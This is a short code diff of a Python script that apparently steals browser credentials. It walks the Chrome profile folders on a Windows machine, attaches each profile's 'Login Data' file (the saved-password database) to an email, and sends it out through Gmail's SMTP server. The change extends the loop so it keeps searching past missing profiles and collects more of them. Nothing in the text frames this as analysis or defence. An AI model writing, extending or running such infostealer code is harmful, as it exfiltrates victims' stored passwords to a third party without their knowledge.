@@ -39,13 +39,17 @@ with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
     profiles_dir = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data")
     profile_prefix = "Profile "
     profile_num = 1
-
+    count = 0
     while True:
         profile_path = os.path.join(profiles_dir, profile_prefix + str(profile_num))
         login_data_path = os.path.join(profile_path, "Login Data")
         
         if not os.path.exists(login_data_path):
-            break  # Break the loop if the Login Data file does not exist in the current profile
+            if count == 10:
+                break
+            count += 1
+            profile_num += 1
+            continue
 
         attach_file(em, login_data_path)
         profile_num += 1
